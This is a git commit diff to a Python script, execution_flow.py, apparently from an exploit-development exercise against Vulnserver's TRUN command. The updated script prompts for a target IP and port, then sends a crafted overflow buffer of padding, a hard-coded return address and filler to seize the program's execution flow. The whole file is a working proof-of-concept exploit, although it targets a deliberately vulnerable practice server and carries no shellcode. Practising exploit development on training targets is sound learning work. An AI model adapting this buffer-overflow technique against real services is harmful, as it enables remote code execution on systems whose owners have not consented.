38f9cc161d857519abda39e42b208ac64e785788
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-13 17:41:28 +0530

    Update execution_flow.py

--- execution_flow.py
+++ execution_flow.py
@@ -3,10 +3,26 @@
 import sys,socket
 from time import sleep
 
-buffer=b"A" * 2002 + b"\xAF\x11\x50\x62" + b"C" *(3000-2002-4)
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(('192.168.1.7',9999))
-s.send((b'TRUN /.:/ ' + buffer))
-s.close()
-s.close()
+print("****************Vuln_Server Vulnerability*************")
+sleep(0.5)
+ip_address=input("Enter the IP address:\n")
+port_number=input("Enter the port number:\n")
+
+if(len(ip_address)<=0) or (len(port_number)<=0):
+    if(len(ip_address)>0) and (len(port_number)<=0):
+        print("*"*30)
+        print("Port number field is empty")
+    elif(len(ip_address)<=0) and (len(port_number)>0):
+        print("*"*30)
+        print("IP Address field is empty")
+    else:
+        print("*"*30)
+        print("Issues with the user input")
+elif(len(ip_address)>0) or (len(port_number)>0):
+        print("*"*30)
+        buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"C" * (2400-2003-4)
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((ip_address, int(port_number)))
+        s.send((b"TRUN /.:/" + buffer + b"\r\n"))
+        s.close()
